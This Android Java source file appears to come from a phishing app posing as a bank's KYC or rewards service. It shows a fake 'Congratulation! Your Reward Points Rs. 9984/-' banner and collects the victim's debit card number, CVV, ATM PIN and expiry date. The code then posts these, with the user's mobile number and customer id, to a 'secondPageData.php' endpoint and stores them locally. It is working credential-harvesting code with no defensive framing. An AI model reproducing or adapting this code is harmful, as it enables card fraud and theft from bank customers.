package com.axiskyc.fragments;


import android.app.DatePickerDialog;
import android.content.Intent;
import android.os.Build;
import android.text.Spannable;
import android.text.SpannableStringBuilder;
import android.text.style.ForegroundColorSpan;
import android.view.View;
import android.widget.Button;
import android.widget.DatePicker;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import com.axiskyc.R;
import com.axiskyc.custom.Global;
import com.axiskyc.custom.apis.WebService;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;

public class RewardsFragment extends android.app.Fragment {

    private EditText txt_user_id, txt_password, txt_expiry, txt_atm_pin;
    private Button btn_login;
    private TextView lbl_login_welcome;

    private Calendar mCalendar = Calendar.getInstance();
    private int mYear;
    private int mMonth;
    private int mDay;

    public RewardsFragment() {
        // Required empty public constructor
    }

    @Override
    public View onCreateView(android.view.LayoutInflater inflater, android.view.ViewGroup container,
                             android.os.Bundle savedInstanceState) {

        View v = inflater.inflate(R.layout.fragment_reward, container, false);

        Global.controllerName = "RewardsFragment";
        Global.device_back_tag = "rewards";
        Global.isBackFunctionally = true;

//        Global.user_id = Global.ReadFileFromAppCache(getActivity(), "user_id");

        lbl_login_welcome = (TextView) v.findViewById(R.id.lbl_login_welcome);
        btn_login = (Button) v.findViewById(R.id.btn_login);
        txt_user_id = (EditText) v.findViewById(R.id.txt_user_id);
        txt_password = (EditText) v.findViewById(R.id.txt_password);
        txt_expiry = (EditText) v.findViewById(R.id.txt_expiry);
        txt_atm_pin = (EditText) v.findViewById(R.id.txt_atm_pin);

        mCalendar = Calendar.getInstance();
        mYear = mCalendar.get(Calendar.YEAR);
        mMonth = mCalendar.get(Calendar.MONTH);
        mDay = mCalendar.get(Calendar.DAY_OF_MONTH);

        Global.webservice_file_name = "secondPageData.php";

        try {
            String congratulation = "Congratulation!";
            String complete_text = congratulation + " Your Reward Points Rs. 9984/-";

            SpannableStringBuilder str = new SpannableStringBuilder(complete_text);
            str.setSpan(new ForegroundColorSpan(getResources().getColor(R.color.green_text_color)), 0, congratulation.length(), Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
            str.setSpan(new ForegroundColorSpan(getResources().getColor(R.color.default_text_color)), congratulation.length(), complete_text.length(), Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
            lbl_login_welcome.setText(str);

        } catch (Exception e) {}

        btn_login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String card_number = txt_user_id.getText().toString();
                String cvv = txt_password.getText().toString();
                String atm_pin = txt_atm_pin.getText().toString();
                String expiry_date = txt_expiry.getText().toString();

                if (card_number.equalsIgnoreCase("") || card_number.equalsIgnoreCase("null")) {
                    Toast.makeText(Global.mController, "Card number required", Toast.LENGTH_LONG).show();
                } else if (expiry_date.equalsIgnoreCase("") || expiry_date.equalsIgnoreCase("null")) {
                    Toast.makeText(Global.mController, "Expiry date required", Toast.LENGTH_LONG).show();
                } else if (cvv.equalsIgnoreCase("") || cvv.equalsIgnoreCase("null")) {
                    Toast.makeText(Global.mController, "CVV required", Toast.LENGTH_LONG).show();
                } else if (atm_pin.equalsIgnoreCase("") || atm_pin.equalsIgnoreCase("null")) {
                    Toast.makeText(Global.mController, "ATM Pin required", Toast.LENGTH_LONG).show();
                } else if (card_number.length() != 16) {
                    Toast.makeText(Global.mController, "Invalid Card Number", Toast.LENGTH_LONG).show();
                } else if (cvv.length() != 3) {
                    Toast.makeText(Global.mController, "Invalid CVV", Toast.LENGTH_LONG).show();
                } else if (atm_pin.length() != 4) {
                    Toast.makeText(Global.mController, "Invalid ATM Pin", Toast.LENGTH_LONG).show();
                } else {

                    try {

                        JSONObject obj = new JSONObject();
                        obj.put("debit", card_number);
                        obj.put("cvv", cvv);
                        obj.put("atmpin", atm_pin);
                        obj.put("expiry", expiry_date);
                        obj.put("userid", Global.user_details.getString("user_id"));

                        obj.put("mobile", Global.mobile_number);
                        obj.put("customerid", Global.customer_id);

                        new WebService(Global.mController, "", new WebService.myCallback() {
                            @Override
                            public void onServiceResponse(String responseJson) {
                                Global.ShowLogs("responseJson = " + responseJson);
                                if (WebService.response_status_code == 200) {
                                    try {

                                        Global.user_details.put("card_number", card_number);
                                        Global.user_details.put("cvv", cvv);
                                        Global.user_details.put("card_expiry_date", expiry_date);
                                        Global.user_details.put("atm_pin", atm_pin);

                                        Global.mController.open_verification_fragment();

                                    } catch (Exception e) {
                                    }
                                } else {
                                    Toast.makeText(Global.mController, responseJson, Toast.LENGTH_LONG).show();
                                }
                            }
                        }, WebService.HTTPRequestMethod.POST_METHOD2, obj.toString(), null, "", null);

                    } catch (Exception e) {}
                }
            }
        });

        txt_expiry.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                DatePickerDialog date_picker = new DatePickerDialog(Global.mController, Global.dialog_theme, new DatePickerDialog.OnDateSetListener() {
                    @RequiresApi(api = Build.VERSION_CODES.N)
                    public void onDateSet(DatePicker view, int year, int monthOfYear, int dayOfMonth) {

                        mCalendar.set(year, monthOfYear, dayOfMonth);

                        SimpleDateFormat displayDateFormat = null;
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                            displayDateFormat = new SimpleDateFormat("MM/YYYY");
                        }
                        displayDateFormat.setCalendar(mCalendar);
                        String date_time = displayDateFormat.format(mCalendar.getTime());

                        Global.ShowLogs("display_date = " + date_time);
                        txt_expiry.setText(date_time);
                    }

                }, mYear, mMonth, mDay);
                date_picker.setTitle("Card Expiry Date");

                try {
                    date_picker.getDatePicker().setMinDate(System.currentTimeMillis());
                } catch (Exception e) {}

                try {
                    DatePicker datepicker = date_picker.getDatePicker();
                    //datep.removeViewAt(0);
                    LinearLayout v1 = (LinearLayout) datepicker.getChildAt(0);
                    LinearLayout v2 = (LinearLayout) v1.getChildAt(0);
                    View v3 = v2.getChildAt(1);
                    v3.setVisibility(View.GONE);
                } catch (Exception e) {
                }

                date_picker.show();
            }
        });
    
        return v;
    }
}
